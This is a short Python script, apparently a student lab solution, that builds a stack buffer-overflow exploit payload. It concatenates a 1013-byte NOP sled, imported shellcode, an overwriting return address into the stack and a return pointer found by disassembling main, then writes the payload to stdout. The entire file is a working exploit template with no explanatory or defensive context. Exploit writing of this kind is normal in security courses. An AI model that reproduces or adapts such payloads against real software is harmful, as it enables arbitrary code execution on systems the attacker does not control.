#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
padding =(b'\x90')*1013                                         # nop-sled
new_ret = pack("<I", 0x08048986)                                # found by disassembling _main
shellcode_addr = pack("<I", 0xffffd399)                         # point into nop-sled pushed on stack
payload = padding + shellcode + shellcode_addr + new_ret        # create payload
sys.stdout.buffer.write(payload)
